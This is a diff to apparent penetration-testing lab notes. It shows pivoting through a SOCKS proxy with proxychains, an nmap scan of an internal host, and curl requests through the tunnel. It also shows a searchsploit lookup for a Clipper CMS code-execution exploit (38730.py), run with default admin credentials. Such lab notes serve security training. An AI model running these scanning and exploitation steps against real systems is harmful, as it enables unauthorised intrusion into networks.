@@ -74,7 +74,7 @@ Jobs
 
 Finally we can scan with proxychains
 
-#proxychains nmap -sT -Pn 192.182.129.3 (internal IP)
+#proxychains nmap -sT -Pn 192.182.129.3 (-sT must be included because we portforward with TCP 9050)
 Port 80 is open
 
 We don't have access to the browser so, use curl thorugh proxychains
@@ -84,7 +84,11 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.182.129.3:80
 <meta http-equiv="refresh"
 content="0;url=/clipper/manager">
-root@attackdefense:~# searchsploit clipper
+
+root@attackdefense:~# searchsploit clipper (code execution > 38730.py)
+root@attackdefense:~# proxychains python 38730.py http://192.181.168.3/clipper admin password
+
+
 _________________________________________________________________________________________________________________________________________________________________________
 SSH tunneling with dynamic port forwarding ( Use proxychains with ssh to do port forwarding )
 -------------------------------------------
